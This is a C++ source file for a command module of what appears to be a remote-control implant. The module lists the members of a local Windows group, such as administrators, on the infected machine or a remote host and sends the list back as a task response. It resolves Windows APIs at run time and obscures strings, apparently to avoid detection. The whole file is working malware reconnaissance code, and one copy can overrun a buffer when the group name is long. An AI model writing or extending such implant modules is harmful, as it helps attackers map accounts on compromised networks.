#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER

using namespace stardust;
using namespace starburst;

typedef struct _LOCALGROUP_MEMBERS_INFO_3 {
    LPWSTR lgrmi3_domainandname;
} LOCALGROUP_MEMBERS_INFO_3;

typedef DWORD (WINAPI *fn_NetLocalGroupGetMembers)( LPCWSTR, LPCWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, PDWORD_PTR );
typedef DWORD (WINAPI *fn_NetApiBufferFree)( LPVOID );

auto declfn starburst::cmd_net_localgroup_member(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "netapi32.dll" ) ) );
    if ( !h_netapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
        return;
    }

    auto pGetMembers = reinterpret_cast<fn_NetLocalGroupGetMembers>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetLocalGroupGetMembers" ) ) );
    auto pFree = reinterpret_cast<fn_NetApiBufferFree>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
    if ( !pGetMembers || !pFree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );
    uint32_t group_len = 0;
    auto group_str = parser_string( params, &group_len );

    if ( !group_str || group_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "group name required" ) ) );
        return;
    }

    wchar_t w_host[256] = { 0 };
    wchar_t* p_host = nullptr;
    if ( host_str && host_len > 0 ) {
        char host_buf[256] = { 0 };
        memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
        p_host = w_host;
    }

    char group_buf[256] = { 0 };
    memory::copy( group_buf, group_str, group_len < 255 ? group_len : 255 );
    wchar_t w_group[256] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, group_buf, -1, w_group, 256 );

    LPBYTE buf = nullptr;
    DWORD entries_read = 0, total_entries = 0;
    DWORD_PTR resume = 0;

    DWORD status = pGetMembers(
        p_host, w_group, 3, &buf, 0xFFFFFFFF,
        &entries_read, &total_entries, &resume );

    if ( status != 0 && status != 234 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NetLocalGroupGetMembers failed" ) ) );
        return;
    }

    uint32_t out_cap = 8192;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        pFree( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;

    // header
    str_copy( output + off, symbol<char*>( const_cast<char*>( "Members of " ) ) );
    off += 11;
    memory::copy( output + off, group_buf, group_len );
    off += group_len;
    output[off++] = ':';
    output[off++] = '\n';

    auto members = reinterpret_cast<LOCALGROUP_MEMBERS_INFO_3*>( buf );
    for ( DWORD i = 0; i < entries_read && off + 300 < out_cap; i++ ) {
        char name[260] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, members[i].lgrmi3_domainandname, -1, name, 260, nullptr, nullptr );
        uint32_t nlen = str_len( name );

        str_copy( output + off, symbol<char*>( const_cast<char*>( "  " ) ) );
        off += 2;
        memory::copy( output + off, name, nlen );
        off += nlen;
        output[off++] = '\n';
    }

    output[off] = '\0';
    pFree( buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
